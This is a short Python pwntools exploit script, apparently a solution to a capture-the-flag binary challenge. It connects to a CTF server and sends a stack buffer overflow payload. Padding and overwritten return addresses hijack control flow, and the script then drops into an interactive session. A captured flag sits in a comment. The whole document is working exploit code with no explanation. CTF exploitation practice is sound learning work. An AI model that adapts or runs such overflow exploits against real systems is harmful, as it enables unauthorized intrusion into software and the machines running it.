from pwn import *
import struct
context(os='linux', arch='i386')

def getConn():
    return process('./bai_2_100') if local else remote('banana.nightst0rm.net', 1337)
#break *0x0804863F 
local = False
#break *0x8048675
#break *0x08048549
#break *0x0804862b
#break *0x804865f
#
r = getConn()
#gdb.attach(r, '''
#break *0x0804867F 
#break *0x804853D
#telescope 30
#c
#''')
#break *0x0804867F
EIP=		'\x2b\x85\x04\x08'
main=		'\x80\x86\x04\x08'
pl='A'*(41+4+4+4)
padding='\x65\x87\x04\x08'
pl2='B'*(72)+'C'*4+EIP+'D'*4
def pwn():
	for i in range(len(pl)):
		r.send(pl[i])
	r.send('\x37')
	r.send('\x13')
	r.send('\x00')

	print r.recv()
	for i in range(len(pl2)):
		r.send(pl2[i])
	r.sendline('\x00')

pwn()

r.interactive()
r.close()
#NightSt0rm{Do_You_Have_Simple_Rop}

#
